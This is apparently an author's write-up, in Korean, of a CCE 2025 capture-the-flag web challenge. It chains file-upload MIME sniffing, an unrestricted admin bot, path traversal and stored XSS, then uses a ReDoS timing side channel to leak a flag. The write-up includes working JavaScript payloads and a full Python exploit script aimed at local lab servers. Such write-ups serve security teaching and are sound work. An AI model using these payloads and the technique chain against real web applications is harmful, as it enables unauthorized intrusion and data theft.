---
title: CCE 2025 ê´‘ëª…êµ­ì œê³µí•­ write-up
date: 2025-09-17
categories: [CTF]
tags: [Write up]
---

## Information
CCE 2025 ë³¸ì„ ì— ì¶œì œí–ˆë˜ `ê´‘ëª…êµ­ì œê³µí•­` ë¬¸ì œì— ëŒ€í•œ ì¶œì œì write-upì…ë‹ˆë‹¤.

## Write-up

í•´ë‹¹ ë¬¸ì œëŠ” ê³µí•­ ì˜ˆì•½ ì„œë²„ì™€ ë¶ˆí¸ì‚¬í•­ ì ‘ìˆ˜ ì„œë²„ê°€ ê°ê° 3000ë²ˆ í¬íŠ¸ì™€ 5000ë²ˆ í¬íŠ¸ì—ì„œ ì‹¤í–‰ì¤‘ì…ë‹ˆë‹¤.  
ë¨¼ì € reservation ì„œë²„ì˜ ê¸°ëŠ¥ì„ ì‚´í´ë³´ë©´ í•­ê³µê¶Œ ì˜ˆì•½ ê¸°ëŠ¥ì´ ì¡´ì¬í•©ë‹ˆë‹¤.  
```javascript
// routes/reservation.js
const uploadDir = path.join(__dirname, '..', 'uploads');
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);

const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        cb(null, uploadDir);
    },
    filename: function (req, file, cb) {
        const raw = Date.now() + '-' + Math.round(Math.random() * 1e6);
        const hash = crypto.createHash('sha256').update(raw).digest('hex');
        const ext = path.extname(file.originalname);

        cb(null, hash + ext);
    }
});
const disallowedExtensions = new Set(['.js', '.mjs', '.cjs']);
const upload = multer({
    storage,
    fileFilter: function (req, file, cb) {
        const ext = path.extname(file.originalname).toLowerCase();
        if (disallowedExtensions.has(ext)) {
            return cb(null, false);
        }
        cb(null, true);
    }
});
(...)
router.post('/create', ensureAuth, upload.array('documents'), async (req, res) => {
    const { flightId, passengers } = req.body;

    if (!mongoose.isValidObjectId(flightId)) {
        return res.redirect('/reservation/create?error=invalidFlightId');
    }

    const flight = await Flight.findById(flightId);
    if (!flight) {
        return res.redirect('/reservation/create?error=flightNotFound');
    }

    const numPassengers = Number(passengers);
    if (!Number.isFinite(numPassengers) || numPassengers < 1) {
        return res.redirect('/reservation/create?error=invalidPassengers');
    }

    const documentPaths = Array.isArray(req.files)
        ? req.files.map(f => path.join('uploads', f.filename))
        : [];
    await Reservation.create({
        userId: req.session.userId,
        flightId,
        passengers: numPassengers,
        documents: documentPaths
    });
    res.redirect('/reservation');
});
```
í•­ê³µí¸ì˜ IDë¥¼ ê²€ì¦í•œ ë’¤ì— í•­ê³µê¶Œì„ ì˜ˆì•½í•©ë‹ˆë‹¤.  
ì´ë•Œ ì‚¬ìš©ìëŠ” íŒŒì¼ì„ ì—…ë¡œë“œí•  ìˆ˜ ìˆê³ , ì—…ë¡œë“œí•˜ëŠ” íŒŒì¼ì—ëŠ” ì œì•½ì´ ì—†ìŠµë‹ˆë‹¤.  
ë˜í•œ íŒŒì¼ëª…ì€ `(hash).ext` í˜•ì‚­ìœ¼ë¡œ ì €ì¥ë˜ë©° í•´ë‹¹ íŒŒì¼ëª…ì€ ì˜ˆì•½ ì¡°íšŒ í˜ì´ì§€ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.  
```html
<% if (Array.isArray(item.documents) && item.documents.length) { %>
    <div>
        ì œì¶œì„œë¥˜:
        <% item.documents.forEach(function(doc, idx){ %>
        <a href="/<%= doc %>" target="_blank" class="chip">íŒŒì¼ <%= idx + 1 %></a>
        <% }) %>
    </div>
<% } %>
```
ì´ë ‡ê²Œ ì—…ë¡œë“œ ëœ íŒŒì¼ì€ `uploads/`ë¥¼ í†µí•´ ì ‘ê·¼ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.
```javascript
app.get('/uploads/:filename', (req, res) => {
    try {
        const filename = req.params.filename;
        const uploadsDir = path.join(__dirname, "uploads");
        const filePath = path.normalize(path.join(uploadsDir, filename));

        if (!filePath.startsWith(uploadsDir)) return res.status(400).send("ì˜ëª»ëœ íŒŒì¼ ê²½ë¡œ ìš”ì²­ì…ë‹ˆë‹¤.");
        if (!fs.existsSync(filePath)) return res.status(404).send("íŒŒì¼ì„ ì°¾ì„ ìˆ˜ ì—†ìŠµë‹ˆë‹¤.");
        if (fs.statSync(filePath).size > 1024 * 1024 * 5) return res.status(413).send("íŒŒì¼ í¬ê¸°ê°€ ë„ˆë¬´ í½ë‹ˆë‹¤.");

        const data = fs.readFileSync(filePath);
        res.write(data);
        return res.end();
    } catch (err) {
        console.error(err);
        res.status(500).send("ì½ê¸° ì˜¤ë¥˜ê°€ ë°œìƒí–ˆìŠµë‹ˆë‹¤.");
    }
});
```
í•´ë‹¹ ë¼ìš°íŠ¸ì˜ ë™ì‘ì€ `fs`ë¥¼ í†µí•´ì„œ íŒŒì¼ì„ ì½ì–´ì„œ í•´ë‹¹ íŒŒì¼ì˜ ë‚´ìš©ì„ `res.write()`ë¥¼ í†µí•´ ì‘ì„±í•œë’¤ `res.end()`ë¥¼ í†µí•´ ìš”ì²­ì„ ì¢…ë£Œí•©ë‹ˆë‹¤.  
`startWith()`ì„ í†µí•´ ì—…ë¡œë“œ í´ë” ë°–ìœ¼ë¡œ ë¹ ì ¸ë‚˜ê°€ì§€ ëª»í•˜ë„ë¡ ë°©ì–´í•˜ë¯€ë¡œ Path Traversal ê³µê²©ì€ ë¶ˆê°€ëŠ¥í•©ë‹ˆë‹¤.  
ì´ë•Œ `no-sniff`í—¤ë”ë‚˜ `Content-Type` í—¤ë”ë¥¼ ì§€ì •í•˜ì§€ ì•Šì•˜ê¸° ë•Œë¬¸ì— ë¸Œë¼ìš°ì €ì—ì„œ ë‚´ìš©ì„ sniffing í•˜ì—¬ íƒ€ì…ì„ ê²°ì •í•©ë‹ˆë‹¤.  

chromiumì˜ sniffing ë™ì‘ì„ ì •ì˜í•œ ì½”ë“œë¥¼ ì•„ë˜ ì£¼ì†Œì—ì„œ ì‚´í´ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.  
https://source.chromium.org/chromium/chromium/src/+/main:net/base/mime_sniffer.cc

ë¸Œë¼ìš°ì €ì˜ Sniffing ë™ì‘ì½”ë“œ ì¤‘ ì§‘ì¤‘í•´ì•¼í•  ì½”ë“œëŠ” 595ë²ˆì§¸ ë¼ì¸ì…ë‹ˆë‹¤.  
https://source.chromium.org/chromium/chromium/src/+/main:net/base/mime_sniffer.cc;l=595
```cpp
if (LooksLikeBinary(content)) {
    result->assign("application/octet-stream");
    return true;
}
```
íŒŒì¼ì˜ contentê°€ `LooksLikeBinary()`ì˜ ì¡°ê±´ì„ ë§Œì¡±ì‹œí‚¤ë©´ mimetypeì„ `application/octet-stream`ìœ¼ë¡œ ì„¤ì •í•©ë‹ˆë‹¤.  
mimetypeì´ `application/octet-stream`ì¸ íŒŒì¼ì„ ì „ë‹¬ë°›ì€ ë¸Œë¼ìš°ì €ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ í•´ë‹¹ ë‚´ìš©ì„ ì‹¤í–‰ì´ë‚˜ í•´ì„í•˜ì§€ ì•Šê³  ë‹¤ìš´ë¡œë“œ í•©ë‹ˆë‹¤.  
ì•„ë˜ëŠ” `LooksLikeBinary()` í•¨ìˆ˜ì˜ ì½”ë“œì…ë‹ˆë‹¤.  
```cpp
bool LooksLikeBinary(std::string_view content) {
  // The definition of "binary bytes" is from the spec at
  // https://mimesniff.spec.whatwg.org/#binary-data-byte
  //
  // The bytes which are considered to be "binary" are all < 0x20. Encode them
  // one bit per byte, with 1 for a "binary" bit, and 0 for a "text" bit. The
  // least-significant bit represents byte 0x00, the most-significant bit
  // represents byte 0x1F.
  const uint32_t kBinaryBits =
      ~(1u << '\t' | 1u << '\n' | 1u << '\r' | 1u << '\f' | 1u << '\x1b');
  for (char c : content) {
    uint8_t byte = static_cast<uint8_t>(c);
    if (byte < 0x20 && (kBinaryBits & (1u << byte)))
      return true;
  }
  return false;
}
```
í•´ë‹¹ í•¨ìˆ˜ëŠ” ëª‡ê°œì˜ ì œì–´ë¬¸ìë¥¼ ì œì™¸í•œ íŠ¹ì •ë²”ìœ„ì˜ ì œì–´ë¬¸ìê°€ íŒŒì¼ ë‚´ìš©ì— í¬í•¨ë˜ì–´ìˆëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.  
ë”°ë¼ì„œ íŒŒì¼ ë‚´ìš©ì— íŠ¹ì •ë²”ìœ„ì˜ ì œì–´ë¬¸ìë¥¼ ë„£ì–´ì„œ ë¸Œë¼ìš°ì €ê°€ í•´ë‹¹ ì‘ë‹µ ë³¸ë¬¸ì„ íŒŒì¼ë¡œ ë‹¤ìš´ë¡œë“œ í•˜ë„ë¡ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.  
ë‹¤ìš´ë¡œë“œë¥¼ íŠ¸ë¦¬ê±°í•˜ëŠ” URLì€ board ì„œë²„ì˜ CSPë¥¼ ìš°íšŒí•˜ëŠ”ë° í™œìš©ë©ë‹ˆë‹¤.  

ë‹¤ìŒìœ¼ë¡œ board ì„œë²„ì˜ ì½”ë“œë¥¼ ì‚´í´ë´…ë‹ˆë‹¤.
í•´ë‹¹ ì„œë²„ì˜ ê²½ìš° ìì‹ ì´ ì˜ˆë§¤í•œ í•­ê³µí¸ì— ëŒ€í•´ì„œ ë¶ˆí¸ì‚¬í•­ì„ ì „ë‹¬í•  ìˆ˜ ìˆëŠ” complaint ê¸°ëŠ¥ì´ ì¡´ì¬í•©ë‹ˆë‹¤.  
```javascript
router.get('/:id', ensureAuth, async (req, res) => {
    if (!mongoose.isValidObjectId(req.params.id)) return res.status(400).send('Invalid id.');

    const item = await Complaint.findById(req.params.id)
        .populate({ path: 'reservationId', populate: { path: 'flightId', model: 'Flight' } });
    if (!item) return res.status(404).send('not found');
    res.render('complaint/view', { req, item });
});
```
ì—¬ê¸°ì„œ ë Œë”ë§í•˜ëŠ” `view.ejs`ì˜ ê²½ìš° HTMLë¬¸ìë¥¼ ê·¸ëŒ€ë¡œ ì¶œë ¥í•˜ë¯€ë¡œ HTML íƒœê·¸ë¥¼ ì‚½ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.  
```html
<div class="mt-12 whitespace-prewrap"><%- item.content %></div>
<div class="mt-16">
    <a href="/complaint" class="btn">ëª©ë¡</a>
    <form method="GET" action="/complaint/call" class="inline-form">
        <input type="hidden" name="url" value="<%= item._id %>">
        <button class="btn">ê´€ë¦¬ì í˜¸ì¶œ</button>
    </form>
</div>
```
í•˜ì§€ë§Œ board ì„œë²„ì˜ ê²½ìš° CSPê°€ ê°•í•˜ê²Œ ì„¤ì •ë˜ì–´ ìˆìŠµë‹ˆë‹¤.  
```javascript
app.use(session({
    secret: process.env.SECRET_KEY || "SESSION_SECRET",
    resave: false,
    saveUninitialized: false,
    store: MongoStore.create({ mongoUrl }),
    cookie: { httpOnly: true }
}));
app.use((req, res, next) => {
    res.setHeader("X-Frame-Options", "deny");
    res.setHeader("Content-Security-Policy", "default-src 'self'; base-uri 'none'");

    next();
});
(...)
app.get('/flag', [ensureAuth, ensureAdmin], (req, res) => {
    return res.json({ flag: process.env.FLAG });
});
```
`default-src`ê°€ `self` ì´ë¯€ë¡œ `script`ë‚˜ `image` ë“±ì„ ëª¨ë‘ í•´ë‹¹ board ì„œë²„ì—ì„œ ê°€ì ¸ì™€ì•¼ í•˜ê³  `connect-src`ë„ `self` ì´ë¯€ë¡œ ì™¸ë¶€ë¡œ fetch ìš”ì²­ ë“±ë„ ë¶ˆê°€ëŠ¥í•©ë‹ˆë‹¤.  
ê·¸ë¦¬ê³  ì„¸ì…˜ ì¿ í‚¤ì˜ ê²½ìš° `HTTP Only`ê°€ ì¼œì ¸ìˆì–´ javascriptì—ì„œ ì ‘ê·¼ì´ ë¶ˆê°€ëŠ¥í•©ë‹ˆë‹¤.  

ì¿ í‚¤ë¥¼ ì–»ì§€ ì•Šì•„ë„ `/flag` ì—”ë“œí¬ì¸íŠ¸ê°€ board ì„œë²„ì— ìˆê¸° ë•Œë¬¸ì— XSSê°€ ë°œìƒí•˜ë©´ fetchë¥¼ í†µí•´ FLAGë¥¼ ì½ì–´ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.  
í•˜ì§€ë§Œ CSPì— ì˜í•´ í•´ë‹¹ board ì„œë²„ ë°–ìœ¼ë¡œ FLAGë¥¼ ìœ ì¶œí•  ìˆ˜ ì—†ê³  board ì„œë²„ ë‚´ë¶€ì—ë„ FLAGë¥¼ ì „ë‹¬í• ë§Œí•œ ê¸°ëŠ¥ì´ ì—†ìœ¼ë¯€ë¡œ FLAGë¥¼ ì•Œì•„ë‚¼ ë°©ë²•ì„ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤.  

ë‹¤ìŒìœ¼ë¡œ ì‚´í´ë³¼ ê¸°ëŠ¥ì€ ê´€ë¦¬ì í˜¸ì¶œ ê¸°ëŠ¥ì…ë‹ˆë‹¤.  
```javascript
router.get('/call', ensureAuth, async (req, res) => {
    const botPath = path.join(__dirname, '..', 'utils', 'bot.js');
    let url = req.query.url;

    if (mongoose.isValidObjectId(url)) url = "http://localhost:3000/complaint/" + url;

    const child = spawn('xvfb-run', ['-a', 'node', botPath, url], {
        stdio: ['ignore', 'pipe', 'pipe'],
        detached: true,
    });

    return res.send('ê´€ë¦¬ìë¥¼ í˜¸ì¶œí•˜ì˜€ìŠµë‹ˆë‹¤.');
});
```
url ì¿¼ë¦¬ë¥¼ í†µí•´ì„œ ê´€ë¦¬ìì—ê²Œ URLì„ ì „ë‹¬í•˜ëŠ”ë° ì´ë•Œ ì›ë˜ëŠ” complaintì˜ `object ID`ê°€ ë“¤ì–´ê°€ì•¼ í•˜ì§€ë§Œ else ì²˜ë¦¬ê°€ ë˜ì–´ìˆì§€ ì•Šì•„ì„œ ì–´ë–¤ URLì„ ì…ë ¥í•´ë„ BOTì´ ë°©ë¬¸í•˜ê²Œ ë©ë‹ˆë‹¤.  
í•˜ì§€ë§Œ íŠ¹ì • URLì„ ì…ë ¥í•˜ë”ë¼ë„ board ì»¨í…Œì´ë„ˆì˜ `iptables` ê·œì¹™ì— ë”°ë¼ BOTì´ í•´ë‹¹ URL ì ‘ì†ì— ì‹¤íŒ¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.  
```sh
# entrypoint.sh
iptables -P OUTPUT DROP
iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT
iptables -A OUTPUT -p tcp -d 192.168.200.10 --dport 27017 -j ACCEPT
iptables -A OUTPUT -p tcp -d 192.168.200.100 --dport 3000 -j ACCEPT
```
í•´ë‹¹ ê·œì¹™ì„ í•´ì„í•´ë³´ë©´ loopback ì¸í„°í˜ì´ìŠ¤ì™€ `192.168.200.10(db)`, `192.168.200.100(reservation)`ì˜ íŠ¹ì • í¬íŠ¸ë¥¼ ì œì™¸í•˜ë©´ OUTPUTì´ ê¸ˆì§€ë˜ì–´ ìˆìŠµë‹ˆë‹¤.  
BOTì˜ ê²½ìš° ì»¨í…Œì´ë„ˆ ë‚´ë¶€ì—ì„œ ì‹¤í–‰ë˜ë¯€ë¡œ í•´ë‹¹ ê·œì¹™ì— ì˜í–¥ì„ ë°›ìŠµë‹ˆë‹¤.  

ë˜í•œ BOTì€ `xvfb`ë¥¼ í†µí•´ `headful`ë¡œ ì‹¤í–‰ë©ë‹ˆë‹¤.  
```javascript
puppeteer.use(require('puppeteer-extra-plugin-user-preferences')({
    userPrefs: {
        safebrowsing: {
            enabled: false,
            enhanced: false
        }
    }
}));

const browser = await puppeteer.launch({
    executablePath: '/usr/bin/chromium',
    headless: false,
    args: [
        '--no-sandbox', '--disable-dev-shm-usage',
        '--no-first-run', '--no-default-browser-check', '--disable-extensions'
    ],
});
```
safe-browsingì´ êº¼ì§„ì±„ë¡œ ìœ„ì™€ ê°™ì€ ì˜µì…˜ì„ ì‚¬ìš©í•˜ì—¬ BOTì´ êµ¬ë™ë©ë‹ˆë‹¤.  
BOTì´ `headful chromium`ì„ ì‚¬ìš©í•˜ë¯€ë¡œ ë”°ë¡œ `CDP(Chrome DevTools Protocol)`ë¥¼ ì„¤ì •í•˜ì§€ ì•Šì•„ë„ ë‹¤ìš´ë¡œë“œê°€ ë°œìƒí•˜ë©´ `~/Downloads` ê²½ë¡œì— íŒŒì¼ì´ ì €ì¥ë©ë‹ˆë‹¤.  
ì´ë¥¼ ì´ìš©í•´ì„œ reservation ì„œë²„ì— íŒŒì¼ ë‹¤ìš´ë¡œë“œê°€ íŠ¸ë¦¬ê±°ë˜ëŠ” íŒŒì¼ì„ ì—…ë¡œë“œ í•˜ê³ , í•´ë‹¹ URLì„ BOTì—ê²Œ ì „ë‹¬í•˜ì—¬ `/root/Downloads` ê²½ë¡œì— íŒŒì¼ì„ ì—…ë¡œë“œí•©ë‹ˆë‹¤.  
ì´ë ‡ê²Œ ì—…ë¡œë“œëœ íŒŒì¼ì„ ë¶ˆëŸ¬ì˜¬ ìˆ˜ ìˆëŠ”ê²½ìš° CSPì˜ `self`ì— ìœ„ë°°ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.  
ë”°ë¼ì„œ í•´ë‹¹ íŒŒì¼ì„ ë¶ˆëŸ¬ì˜¬ ìˆ˜ ìˆëŠ”ê²½ìš° script ì‹¤í–‰ ë“±ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.  

ì•„ë˜ëŠ” board ì„œë²„ì˜ static ë¼ìš°íŠ¸ì˜ ì½”ë“œì…ë‹ˆë‹¤.  
```javascript
router.get('/*', (req, res) => {
    const requested = req.params[0] || '';
    const staticRoot = path.resolve(path.join(__dirname, '..', 'static'));
    const candidate = path.resolve(path.join(staticRoot, requested));

    return res.sendFile(candidate, (err) => {
        if (err) {
            return res.status(err.statusCode || 404).send('not found');
        }
    });
});
```
í•´ë‹¹ ë¼ìš°íŠ¸ì˜ ê²½ìš° ê²½ë¡œì— ì•„ë¬´ëŸ° ì œì•½ì´ ì—†ìœ¼ë¯€ë¡œ `Path traversal` ê³µê²©ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.  
í•´ë‹¹ ë¼ìš°íŠ¸ë¥¼ í†µí•´ì„œ ì—…ë¡œë“œí–ˆë˜ íŒŒì¼ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.  
```
/static/..%2f..%2froot/Downloads/(filename)
```

ë”°ë¼ì„œ ì•„ë˜ì™€ ê°™ì€ ë‚´ìš©ì˜ íŒŒì¼ì„ reservation ì„œë²„ì— ì—…ë¡œë“œí•˜ê³  BOTì—ê²Œ URLì„ ì „ë‹¬í•˜ì—¬ board ì„œë²„ì— ì—…ë¡œë“œí•œ ë’¤ complaint ê¸°ëŠ¥ì„ ì´ìš©í•˜ì—¬ XSSë¥¼ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.  
ì´ë•Œ íŒŒì¼ ì—…ë¡œë“œì‹œ `.js` í™•ì¥ìëª…ì´ í•„í„°ë§ë˜ëŠ”ë° mimetypeì¤‘ `audio/*`, `image/*`, `video/*`, `text/csv`ë¥¼ ì œì™¸í•˜ë©´ ì–´ë–¤ minetypeë„ scriptíƒœê·¸ì˜ srcê°’ìœ¼ë¡œ ì œê³µë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.  
`/static`ì˜ `sendFile()`ì€ íŒŒì¼ëª…ì„ í†µí•´ í™•ì¥ìë¥¼ ì¶”ì¶œí•˜ë¯€ë¡œ `.html`ê°™ì€ í™•ì¥ìì˜ íŒŒì¼ì„ ì—…ë¡œë“œí•˜ì—¬ ë°˜í™˜ë˜ëŠ” mimetypeì„ `text/html`ë¡œ ì„¤ì •í•˜ì—¬ ê³µê²©ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.  
```javascript
/*\x00*/alert(1);
```
```html
<script src="http://localhost:5000/static/..%2f..%2froot/Downloads/(hash).html"></script>
```
ì´ë•Œ srcê°’ì˜ ë„ë©”ì¸ì´ localostì´ë¯€ë¡œ BOTì—ê²Œ ì „ë‹¬í•˜ëŠ” URLë„ `http://localhost:5000/complaint/(objectID)` í˜•ì‹ì´ ë˜ì–´ì•¼ í•©ë‹ˆë‹¤.  

í•˜ì§€ë§Œ CSPì™€ iptable ê·œì¹™ë•Œë¬¸ì— `fetch`ë‚˜ `location.href`ê°’ì„ ë°”ê¾¸ëŠ” ë“±ì˜ í–‰ìœ„ë¥¼ í†µí•´ì„œ ì™¸ë¶€ë¡œ FLAGë¥¼ ìœ ì¶œí•˜ëŠ”ê²ƒì€ ì‚¬ì‹¤ìƒ ë¶ˆê°€ëŠ¥í•©ë‹ˆë‹¤.  
ì´ë¥¼ ìš°íšŒí•˜ê¸° ìœ„í•´ì„œ board ì„œë²„ ë‚´ë¶€ì˜ ì·¨ì•½ì ì„ í™œìš©í•©ë‹ˆë‹¤.  
`routes/auth.js`ë¥¼ ë³´ë©´ íšŒì›ê°€ì…ì‹œ emailì„ ê²€ì¦í•˜ëŠ” regexê°€ ì¡´ì¬í•¨ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```javascript
const emailRegex = /^([a-z0-9]+)+@[a-z0-9]+\.[a-z]+$/i;
(...)
if (!emailRegex.test(email)) {
    return res.status(400).render('auth/register', { error: 'ì´ë©”ì¼ í˜•ì‹ì´ ì˜¬ë°”ë¥´ì§€ ì•ŠìŠµë‹ˆë‹¤.' });
}
```
í•´ë‹¹ regexì˜ ê²½ìš° `[ì˜ë¬¸/ìˆ«ì]+@[ì˜ë¬¸/ìˆ«ì]+\.[ì˜ë¬¸]+` í˜•ì‹ì˜ ë¬¸ìì—´ì¸ì§€ í™•ì¸í•˜ì§€ë§Œ `([a-z0-9]+)+`ì™€ ê°™ì´ ì‘ì„±ë˜ì–´ìˆìœ¼ë¯€ë¡œ `Backtracking`ìœ¼ë¡œ ì¸í•´ `redos`ê°€ ë°œìƒí•©ë‹ˆë‹¤.  
`Node.js`ì˜ ê²½ìš° ë‹¨ì¼ ìŠ¤ë ˆë“œê¸°ë°˜ ì´ë²¤íŠ¸ë£¨í”„ ëª¨ë¸ì„ ì‚¬ìš©í•˜ë¯€ë¡œ CPUë¥¼ ë§ì´ ì†Œëª¨í•˜ëŠ” ì‘ì—…ì´ ì´ë²¤íŠ¸ ë£¨í”„ë¥¼ ì ìœ í•˜ë©´ ë‹¤ë¥¸ ìš”ì²­ì˜ ì²˜ë¦¬ê°€ ì§€ì—°ë©ë‹ˆë‹¤. 
ë”°ë¼ì„œ ì˜ë„ì ìœ¼ë¡œ Redos ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±° í•˜ì—¬ ì„œë²„ ì§€ì—°ì„ í†µí•œ `Information Leak`ì´ ê°€ëŠ¥í•´ì§‘ë‹ˆë‹¤.  
ì•„ë˜ëŠ” XSSë¥¼ í†µí•´ Redosë¥¼ íŠ¸ë¦¬ê±°í•˜ëŠ” ë°©ë²•ì…ë‹ˆë‹¤.  
```javascript
const num = Array.from({ length: 5 }, () => Math.floor(Math.random() * 10)).join("");
const params = new URLSearchParams();
params.append("username", "test" + num);
params.append("password", "test");
params.append("email", "a".repeat(32) + "!");

fetch('/auth/register', {
    method: 'POST',
    body: params
});
```
í•´ë‹¹ JSë¥¼ ì‹¤í–‰ì‹œì¼œ `/auth/register`ì— ì¡´ì¬í•˜ëŠ” redosë¥¼ íŠ¸ë¦¬ê±°í•˜ì—¬ ì„œë¹„ìŠ¤ë¥¼ ì§€ì—°ì‹œí‚¤ëŠ” ê²ƒìœ¼ë¡œ FLAGë¥¼ í•œê¸€ìì”© Leakí•˜ëŠ”ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.  

ì•„ë˜ëŠ” FLAGì˜ në²ˆì§¸ ìë¦¬ì˜ ë¬¸ìì—´ì´ Nì¸ ê²½ìš° Redosë¥¼ íŠ¸ë¦¬ê±°í•˜ì—¬ ì§€ì—°ì„ ì¼ìœ¼í‚¤ëŠ” payload ì…ë‹ˆë‹¤.  
(ğŸ’¡ payloadì˜ ê°•ë„ëŠ” ì„œë²„ í™˜ê²½ì— ë”°ë¼ ì¡°ì •í•©ë‹ˆë‹¤.)
```javascript
/*\x00*/(async () => {
    const res = await fetch('/flag', {
        credentials: 'include'
    });
    const data = await res.json();
    if (data.flag[n] === 'N') {
        const num = Array.from({ length: 5 }, () => Math.floor(Math.random() * 10)).join("");
        const params = new URLSearchParams();
        params.append("username", "test" + num);
        params.append("password", "test");
        params.append("email", "a".repeat(32) + "!");

        fetch('/auth/register', {
            method: 'POST',
            body: params
        });
    }
})();
```
ì´ëŸ¬í•œ ë°©ì‹ìœ¼ë¡œ FLAGë¥¼ í•œê¸€ìì”© LEAKí•˜ì—¬ FLAGë¥¼ íšë“í•©ë‹ˆë‹¤.  
```python
import requests
import random
import threading
import time
import re

reservation = 'http://localhost:3000'
reservation_internal = 'http://192.168.200.100:3000'
board = 'http://localhost:5000'
board_internal = 'http://192.168.200.200:5000'

reservation_session = requests.Session()
board_session = requests.Session()

threshold = 31

def get_temp_session(username, password):
    s = requests.Session()
    s.post(f"{board}/auth/login",
           data={"username": username, "password": password},
           headers={"Connection": "close"},
           timeout=(3, 30))
    return s

def reservation_register(username, password, email):
    res = reservation_session.post(f"{reservation}/auth/register", data={
        "username": username,
        "password": password,
        "email": email
    }, timeout=60)

    return True

def reservation_login(username, password):
    res = reservation_session.post(f"{reservation}/auth/login", data={
        "username": username,
        "password": password
    })

    return True

def board_login(username, password):
    board_session.post(f"{board}/auth/login", data={
        "username": username,
        "password": password
    })

    return True

def download(fileHash):
    board_session.get(f"{board}/complaint/call?url={reservation_internal}{fileHash}")

    return True

def reservation_create_flight(flight_id, passengers, i):
    for j in range(16):

        char = charset[j]
        files = [
            ("documents",("test.html", """/*\x00*/(async () => {
            const res = await fetch('/flag', {
                credentials: 'include'
            });
            const data = await res.json();
            if (data.flag["""+ str(i) + """] === '""" + char + """') {
                const num = Array.from({ length: 5 }, () => Math.floor(Math.random() * 10)).join("");
                const params = new URLSearchParams();
                params.append("username", "test" + num);
                params.append("password", "test");
                params.append("email", "a".repeat(""" + str(threshold) + """) + "!");

                fetch('/auth/register', {
                    method: 'POST',
                    body: params
                });
            }
        })();""", "text/plain"))
        ]

        res = reservation_session.post(
            f"{reservation}/reservation/create",
            data={
                "flightId": flight_id,
                "passengers": passengers
            },
            files=files,
            allow_redirects=False
        )

        fileHash = getFileHash()
        download(fileHash)
        complaint_create(f"{i}_{char}", """<script src="http://localhost:5000/static/..%2f..%2froot/Downloads/""" + fileHash.replace("/uploads/", "") + """"></script>""")
        time.sleep(1)

    return True

def getFileHash():
    res = reservation_session.get(f"{reservation}/reservation")
    
    pattern = r'href="(/uploads[^"]+)"'
    matches = re.findall(pattern, res.text)

    return matches[0]

def get_reservation_id():
    res = board_session.get(f"{board}/complaint/create")
    pattern = r'value="([^"]+)"'
    matches = re.findall(pattern, res.text)

    return matches[0]

def complaint_create(title, content):
    board_session.post(f"{board}/complaint/create", data={
        "reservationId": get_reservation_id(),
        "title": title,
        "content": content
    })
    
    return True

def get_flight_id():
    res = reservation_session.get(f"{reservation}/reservation/create")
    pattern = r'value="([^"]+)"'
    matches = re.findall(pattern, res.text)

    return matches[0]

def get_complaint_id_list():
    res = board_session.get(f"{board}/complaint")
    pattern = r'href="(/complaint/[0-9a-fA-F]{24})"'
    matches = re.findall(pattern, res.text)

    return matches

def call_complaint(session, complaint_id):
    session.get(f"{board}/complaint/call?url=http://localhost:5000{complaint_id}",timeout=60)

def leakFlag():
    complaint_id_list = get_complaint_id_list()

    for i in range(16):
        complaint_id = complaint_id_list[i]

        temp_session = get_temp_session(username, password)
        temp_session_2 = get_temp_session(username, password)

        threading.Thread(
            target=call_complaint, 
            args=(temp_session, complaint_id),
            daemon=True
        ).start()

        time.sleep(2)

        start = time.time()
        temp_session_2.get(f"{board}", timeout=60)
        end = time.time()

        print(end - start)

        if end - start > 3:
            return charset[::-1][i]

        time.sleep(1)

username = "dummy" + str(random.randint(1000, 9999))
password="dummy"
charset = "0123456789abcdef"
flag="cce2025{"

print(username, password)
reservation_register(username, password, f"{username}@example.com")
reservation_login(username, password)
board_login(username, password)

reservation_register("test", "test", f"{"a"*(threshold-1)}!")

flight_id = get_flight_id()

for i in range(len(flag), 24):
    reservation_create_flight(flight_id, 1, i)
    time.sleep(10)
    flag += leakFlag()
    print(f"[+] Leaking Flag: {flag}")
    
print(f"[+] Final Flag: {flag}"+"}")
```